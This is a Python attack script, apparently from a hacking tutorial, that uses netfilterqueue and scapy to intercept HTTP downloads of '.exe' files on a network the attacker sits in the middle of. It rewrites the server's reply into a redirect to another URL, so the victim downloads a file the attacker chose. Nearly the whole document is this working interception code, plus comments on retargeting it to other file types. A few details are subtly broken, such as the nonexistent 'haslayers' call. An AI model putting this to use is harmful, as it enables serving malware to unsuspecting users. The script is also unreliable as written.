#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

ack_list= []
def set_load(packet, load):
    # remove everytime u modify packets
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayers(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80: #for http for packet leaving i.e. request
            if ".exe" in scapy_packet[scapy.Raw].load: #use any file extension like jpg
                print("[+] exe request")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 80: #for packet leaving http ie. response
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently \n Location: http://www.example.org/index.asp \n\n")
                #any link with .exe

                packet.set_payload(str(modified_packet))

            

    packet.accept() #for dns

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) #0 for the queue we created in the cmd
queue.run()
